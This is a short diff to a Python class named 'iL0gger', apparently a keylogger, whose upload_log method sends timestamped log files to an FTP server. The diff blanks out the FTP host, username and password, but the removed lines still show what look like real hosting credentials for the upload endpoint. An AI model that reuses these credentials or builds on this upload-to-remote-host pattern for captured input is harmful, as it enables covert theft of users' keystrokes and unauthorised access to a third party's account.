@@ -18,9 +18,9 @@ class iL0gger:
             self.upload_log()
 
     def upload_log(self):
-        ftp_host = "ftpupload.net"
-        ftp_user = "if0_40751361"
-        ftp_pass = "h4IiXCR5P6"
+        ftp_host = ""
+        ftp_user = ""
+        ftp_pass = ""
 
         timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
         new_filename = f"file_{timestamp}.txt"
